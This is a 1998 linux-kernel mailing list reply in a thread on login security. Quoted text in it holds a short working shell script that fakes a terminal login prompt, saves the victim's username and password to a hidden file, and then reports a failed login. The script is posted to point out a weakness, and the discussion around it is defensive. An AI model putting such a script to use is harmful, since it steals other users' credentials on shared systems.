Return-Path: <owner-linux-kernel-outgoing@vger.rutgers.edu>
Received: by vger.rutgers.edu id <154052-31090>; Mon, 14 Dec 1998 07:52:25 -0500
Received: from p3.hh.shuttle.de ([194.95.238.3]:3758 "EHLO debian.zuhause.de" ident: "root") by vger.rutgers.edu with ESMTP id <154233-31090>; Mon, 14 Dec 1998 06:30:13 -0500
Message-ID: <19981213162524.B17371@pinguin.conetix.de>
Date: Sun, 13 Dec 1998 16:25:24 +0100
From: jens@pinguin.conetix.de
To: linux-kernel@vger.rutgers.edu
Subject: Re: Linux login security approaches
Mail-Followup-To: linux-kernel@vger.rutgers.edu
References: <19981207144143.A19454@knt.terra.vein.hu> <Pine.LNX.4.05.9812080125180.3246-100000@cyril.iaeste.dtu.dk> <19981209203129.C26554@pinguin.conetix.de> <19981212061305.G386@uni-koblenz.de>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
X-Mailer: Mutt 0.93i
In-Reply-To: <19981212061305.G386@uni-koblenz.de>; from ralf@uni-koblenz.de on Sat, Dec 12, 1998 at 06:13:05AM +0100
X-No-Archive: Yes
X-Operating-System: Linux 2.1.131
Sender: owner-linux-kernel@vger.rutgers.edu

On Sat, Dec 12, 1998 at 06:13:05AM +0100, ralf@uni-koblenz.de wrote:

>> What about just starting (as evil_user, who has an account) the following,
>> hiding behind a corner, and wait for another user?
>> 
>> #!/bin/sh
>> #
>> echo -n "`uname -n` login: "
>> read LOGIN
>> echo -n "Password: "
>> read PW
>> echo $LOGIN $PW >> ~/sneaked_passwords.txt
>> chmod 0600 ~/sneaked_passwords.txt
>> echo "Login incorrect"
>> sleep 1
>> logout
>> 
>> (of course, this has to be a text terminal)
>
> A shell script like that was included with ``UNIX Programmers Workbench'',
> volume 2, as delivered with Edition 7 ...

I'll have a look into this book in our library if they have it, thanks. :)


-- 
_ciao, Jens_______________________________ http://www.pinguin.conetix.de
    cat /dev/boiler/water | tea | sieve > /cup
    mount -t hdev /dev/human/mouth01 /mouth ; cat /cup >/mouth/gulp

-
To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
the body of a message to majordomo@vger.rutgers.edu
Please read the FAQ at http://www.tux.org/lkml/
